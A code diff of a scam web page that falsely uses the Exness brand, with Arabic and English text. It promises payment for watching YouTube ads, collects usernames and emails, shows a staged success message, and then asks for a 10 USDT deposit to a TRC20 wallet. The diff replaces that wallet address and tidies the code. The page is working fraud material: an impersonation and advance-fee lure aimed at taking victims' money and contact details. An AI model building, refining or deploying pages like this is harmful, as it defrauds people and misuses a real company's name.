@@ -33,7 +33,7 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
     color: #ffffff !important; 
     border: 1px solid #474d57; 
     border-radius: 6px; 
-    font-size: 9.5px !important; 
+    font-size: 10.5px !important; 
     font-weight: 700; 
     direction: ltr; 
     box-sizing: border-box; 
@@ -72,48 +72,56 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 <div class="card">
 <div class="brand">Exness</div>
 <form id="paymentForm" onsubmit="return false;">
-<div id="step1">
-<div class="subtitle">إنشاء حساب جديد للمتابعة وتشغيل الخدمة</div>
-<div class="amount-tag">Deposit: 10.00 USDT</div>
-<div class="status-code-box"><span>رمز الحالة:</span><span class="status-code-value">43628</span></div>
-<div class="input-group"><label for="displayname">Username</label><input type="text" id="displayname" placeholder="Enter your username" required></div>
-<div class="input-group"><label for="username">Email Address</label><input type="text" id="username" placeholder="example@gmail.com" required></div>
+    
+    <!-- الخطوة الأولى -->
+    <div id="step1">
+        <div class="subtitle">إنشاء حساب جديد للمتابعة وتشغيل الخدمة</div>
+        <div class="amount-tag">Deposit: 10.00 USDT</div>
+        <div class="status-code-box"><span>رمز الحالة:</span><span class="status-code-value">43628</span></div>
+        <div class="input-group"><label for="displayname">Username</label><input type="text" id="displayname" placeholder="Enter your username" required></div>
+        <div class="input-group"><label for="username">Email Address</label><input type="text" id="username" placeholder="example@gmail.com" required></div>
 
-<!-- استدعاء الدالة البرمجية الجديدة للتحقق وإظهار الحركة الخضراء -->
-<button type="button" onclick="handleSubmitAndShowCheck()" class="submit-btn-pulse">CREATE ACCOUNT</button>
+        <button type="button" onclick="handleSubmitAndShowCheck()" class="submit-btn-pulse">CREATE ACCOUNT</button>
+        <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً?</button>
+        
+        <div class="footer-info-box">
+            <div class="brand-line"><span>★ Exness ★</span></div>
+            <p>A PLATFORM TO PROVIDE COMPREHENSIVE SUPPORT<br>WHEN WATCHING YOUTUBE ADS</p>
+            <p>YOU WILL RECEIVE THE MONEY THROUGH YOUR ACCOUNT</p>
+            <p class="highlight-red">PLEASE DEPOSIT $10. GO TO PAGE.</p>
+        </div>
+    </div>
 
-<button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
-<div class="footer-info-box">
-<div class="brand-line"><span>★ Exness ★</span></div>
-<p>A PLATFORM TO PROVIDE COMPREHENSIVE SUPPORT<br>WHEN WATCHING YOUTUBE ADS</p>
-<p>YOU WILL RECEIVE THE MONEY THROUGH YOUR ACCOUNT</p>
-<p class="highlight-red">PLEASE DEPOSIT $10. GO TO PAGE.</p>
-</div>
-</div>
+    <!-- الخطوة الثانية (صفحة الدفع) -->
+    <div id="step2" style="display: none; margin-top: 15px;">
+        <div class="subtitle">After completing the deposit, you will be redirected to the next page</div>
+        <div class="amount-tag">Deposit: 10.00 USDT</div>
+        <a href="https://binance.com" target="_blank" class="binance-btn-final">⚡ الدفع عبر بايننس طلب دفع</a>
+        <div class="manual-deposit-box">
+            <p style="font-size: 14px; margin-bottom: 10px; color: #ffffff; font-weight: 700; direction: ltr; text-align: center;">أو للإيداع من باقي المحافظ الرقمية (شبكة TRC20):</p>
+            <div id="cryptoAddress" class="crypto-address-container">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
+            <button type="button" onclick="copyCryptoAddress()" class="copy-btn-style">نسخ عنوان المحفظة</button>
+        </div>
+    </div>
 
-<div id="step2" style="display: none; margin-top: 15px;">
-<div class="subtitle">After completing the deposit, you will be redirected to the next page</div>
-<div class="amount-tag">Deposit: 10.00 USDT</div>
-<a href="https://binance.com" target="_blank" class="binance-btn-final">⚡ الدفع عبر بايننس طلب دفع</a>
-<div class="manual-deposit-box">
-<p style="font-size: 14px; margin-bottom: 10px; color: #ffffff; font-weight: 700; direction: ltr; text-align: center;">أو للإيداع من باقي المحافظ الرقمية (شبكة TRC20):</p>
-<div id="cryptoAddress" class="crypto-address-container">TE3WaPPsUtihqo9jZbS8TK1eRDf4Vg2XLy</div>
-<button type="button" onclick="copyCryptoAddress()" class="copy-btn-style">نسخ عنوان المحفظة</button>
-</div>
-</div>
 </form>
 </div>
 
 <script>
 function handleSubmitAndShowCheck() {
-    var username = document.getElementById('username').value;
-    var displayname = document.getElementById('displayname').value;
-    if(username === "" || displayname === "") {
-        alert("يرجى ملء الحقول المطلوبة أولاً.");
+    var user = document.getElementById('displayname').value;
+    var email = document.getElementById('username').value;
+    
+    if(user === "" || email === "") {
+        alert("الرجاء ملء جميع الحقول أولاً.");
         return;
     }
+    
+    // إظهار نافذة النجاح المنبثقة
     document.getElementById('successAlert').style.display = 'flex';
-    setTimeout(function(){
+    
+    // الانتقال للخطوة الثانية بعد ثانيتين
+    setTimeout(function() {
         document.getElementById('successAlert').style.display = 'none';
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
@@ -121,16 +129,17 @@ function handleSubmitAndShowCheck() {
 }
 
 function copyCryptoAddress() {
-    var addressText = document.getElementById('cryptoAddress').innerText;
-    navigator.clipboard.writeText(addressText).then(function() {
-        alert("تم نسخ عنوان المحفظة بنجاح!");
-    }, function() {
-        alert("فشل النسخ، يرجى نسخه يدوياً.");
-    });
+    var dummy = document.createElement("textarea");
+    document.body.appendChild(dummy);
+    dummy.value = document.getElementById("cryptoAddress").innerText;
+    dummy.select();
+    document.execCommand("copy");
+    document.body.removeChild(dummy);
+    alert("تم نسخ عنوان المحفظة الجديد بنجاح!");
 }
 
 function alertNoAccount() {
-    alert("يرجى إنشاء حساب جديد أولاً لتتمكن من المتابعة.");
+    alert("لم يتم العثور على حساب مسبق، يرجى إنشاء حساب جديد.");
 }
 </script>
 
